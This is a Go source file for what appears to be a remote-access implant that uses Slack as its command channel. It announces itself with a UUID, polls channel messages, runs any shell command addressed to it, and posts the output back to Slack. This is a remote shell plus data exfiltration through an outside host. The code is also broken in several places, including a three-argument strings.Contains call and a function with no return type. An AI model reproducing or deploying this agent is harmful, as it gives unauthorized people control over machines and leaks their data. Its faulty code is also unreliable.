package main


import (
	    "strings"
	    "internal/logger/logger"
        "internal/pkg/listeners/slack"
        "internal/pkg/platform/linux/cmd"
        "github.com/google/uuid"
	)

var uuidAgent string


func generateUUID(){
	id := uuid.New()
	return id.String()
}



func init (){
	uuidAgent = generateUUID()
    slack.SlackPostMessage("Agent with UUID " + uuidAgent + " is Connected")
}

func main(){
	last := ""
	for true {
	channelHistory := slack.getSlackChannelHistory()
	  for _,data := range channelHistory{
    	if strings.Contains(data.Text,uuidAgent,"exec"){
        	 if strings.Compare(last,data.Text) != 0  {
                    shellCommand := strings.Replace(data.Text, uuidAgent + " exec ","", -1)
                    output := cmd.shellOutput(shellCommand)
                    logger.Info("Commadn Executed : "+data.Text)
                    slack.SlackPostMessage(output)
                    last = data.Text
          }
      }
    }
  }
}